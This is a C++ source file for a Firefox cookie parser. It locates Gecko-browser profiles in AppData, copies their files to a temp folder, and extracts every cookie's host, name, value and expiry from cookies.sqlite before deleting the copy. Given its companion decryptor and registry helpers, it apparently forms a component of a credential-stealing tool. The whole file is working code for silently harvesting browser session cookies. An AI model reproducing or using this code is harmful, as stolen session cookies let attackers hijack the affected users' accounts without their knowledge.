#include "FireFoxCookiesParser.h"


#include <iostream>

#include "FileOperations.h"
#include "FirefoxDecryptor.h"
#include "RegEditHelper.h"
#include "sqlite3.h"

FireFoxCookiesParser::FireFoxCookiesParser()
{

}

List<CookieData> FireFoxCookiesParser::collect_data()
{
	auto browsers = this->get_mozilla_browsers();

	for (const auto& browser : browsers)
	{

		
		auto dir_profile = this->get_profile_dir(browser);	
		
		String temp_dir;
		this->prepare_imports(dir_profile, temp_dir);

			
		String cookie_db = temp_dir + "\\cookies.sqlite";

		if(!IO::is_file_exists(cookie_db)) continue;
		
		sqlite3* db;

		if (sqlite3_open(cookie_db.c_str(), &db) != SQLITE_OK)
			return m_data;


		sqlite3_stmt* stmt;
		if (sqlite3_prepare_v2(db, "SELECT  host,name, path, value, expiry FROM moz_cookies", -1, &stmt, 0) != SQLITE_OK)
			return m_data;

		int entries = 0;		

		while (sqlite3_step(stmt) == SQLITE_ROW)
		{
			CookieData user_data;

			char* host_key = (char*)sqlite3_column_text(stmt, 0);
			char* name = (char*)sqlite3_column_text(stmt, 1);
			char* path = (char*)sqlite3_column_text(stmt, 2);
			char* value = (char*)sqlite3_column_text(stmt, 3);
			char* expires_utc = (char*)sqlite3_column_text(stmt, 4);


			if (host_key == nullptr && name == nullptr && value == nullptr)
				break;
			if ((strlen(host_key) == 0) && (strlen(name) == 0) && (strlen(value) == 0))
				continue;


			user_data.HostKey = host_key;
			user_data.Name = name;
			user_data.Path = path;
			user_data.Value = value;
			user_data.ExpireUTC = expires_utc;	
			

			m_data.emplace_back(user_data);
			entries++;
		}	
		

		IO::remove_directory(temp_dir.c_str());		
	}

	return m_data;
}

List<String> FireFoxCookiesParser::get_mozilla_browsers()
{
	const auto m_path_local_data = IO::get_app_folder(CSIDL_APPDATA);

	List<String> foundBrowsers;
	for (auto& browser : m_gecko_list)
	{
		std::string bdir = m_path_local_data + browser;
		if (IO::is_exist_dir(bdir))
		{
			foundBrowsers.emplace_back(bdir);
		}
	}
	return std::move(foundBrowsers);
}

String FireFoxCookiesParser::get_profile_dir(const String& dir_localdata)
{
	try
	{		
		String dir = dir_localdata + "\\Profiles";
		
		if (IO::is_exist_dir(dir))
		{
			List<String> sub_profiles;
			IO::get_subdirs(sub_profiles, dir);
			
			for (const auto& profile_mozilla : sub_profiles)
			{
				auto dir_profile = dir + "\\" + profile_mozilla;
				
				const std::string logins = (dir_profile + "\\cookies.sqlite");
				
				if (IO::is_file_exists(logins))
				{
					return dir_profile;
				}
			}			
		}		
	}
	catch (...)
	{
		
	}
	return "";
}



bool FireFoxCookiesParser::prepare_imports(String profile_dir, String& out_temp_dir)
{
	String profile_name;
	
	auto firstNull = profile_dir.find_last_of("\\");
	if (firstNull != String::npos)
		profile_name = profile_dir.substr(firstNull+1);

	out_temp_dir = IO::get_temp_folder() + profile_name;

	if (!IO::is_exist_dir(out_temp_dir))
		IO::create_directory_recursively(out_temp_dir.c_str());

	for(const auto& file : m_required_files)
	{
		try
		{
			
			auto from = (profile_dir+"\\" + file);
			auto to = (out_temp_dir + "\\" + file);

			if (IO::is_file_exists(from))
				IO::copy_file(from, to);
		}
		catch (...)
		{
			return false;
		}
	}

	
	return true;
}


/*
 *
 *
 *
 *
 * 
 */
